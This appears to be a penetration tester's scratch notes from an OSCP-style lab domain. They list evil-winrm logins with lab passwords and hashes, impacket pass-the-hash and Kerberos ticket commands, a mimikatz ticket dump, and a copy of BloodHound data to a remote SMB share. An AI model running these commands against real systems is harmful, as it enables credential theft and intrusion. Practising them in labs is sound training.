[[Editing Copy Page]]

```
evil-winrm -i 192.168.123.206 -u 'r.andrews' -p 'BusyOfficeWorker890'
```

MS01 administrator evilwinrm login
```
evil-winrm -i 192.168.123.206 -u 'Administrator' -H '2a00a0a55d5a916e79c91ad30e770715'
```

```
impacket-psexec SRV22.oscp.exam/Administrator@172.16.123.202 -hashes aad3b435b51404eeaad3b435b51404ee:2a00a0a55d5a916e79c91ad30e770715
```

```
aad3b435b51404eeaad3b435b51404ee:2a00a0a55d5a916e79c91ad30e770715
```

```
netexec smb 172.16.123.200 -u 'svc_mssql' -p 'qazwsx' -k --generate-krb5-file krb5.conf
```

```
impacket-wmiexec -hashes 'aad3b435b51404eeaad3b435b51404ee:2a00a0a55d5a916e79c91ad30e770715' -dc-ip 172.16.123.200 administrator@192.168.123.206
```

```
impacket-getTGT oscp.exam/Administrator -hashes ':aad3b435b51404eeaad3b435b51404ee:2a00a0a55d5a916e79c91ad30e770715' -dc-ip 172.16.123.200
```

```
impacket-getTGT 'DC20.oscp.exam/svc_mssql:qazwsx' -dc-ip 172.16.123.200
```

```
export KRB5CCNAME=svc_mssql.ccache
```

```
.\mimikatz.exe "privilege::debug" "sekurlsa::tickets /export" "exit"
```

```
copy 20261126073219_BloodHound.zip \\192.168.49.123\share\
```

```
impacket-mssqlclient oscp.exam/svc_mssql@172.16.123.202 -windows-auth
```

```
netexec smb DC20.oscp.exam -u 'svc_mssql' -p 'qazwsx' -k --generate-krb5-file krb5.conf
```

```

```

```

```

```

```

```

```

```

```

```

```

```

```

```

```

```

```

```

```

```

```

```

```

```

```

```

```

```

```

```

```

```

```

```

```

```

```

```

```

```

```

```

```

```

```

```

```

```

```

```

```

```

```

```

```

```

```

```

```

```

```

```

```

```

```

```

```

```

```

```

```

```

```

```

```

```

```

```

```

```

```

```

```

```

```

```

```

```

```

```

```

```

```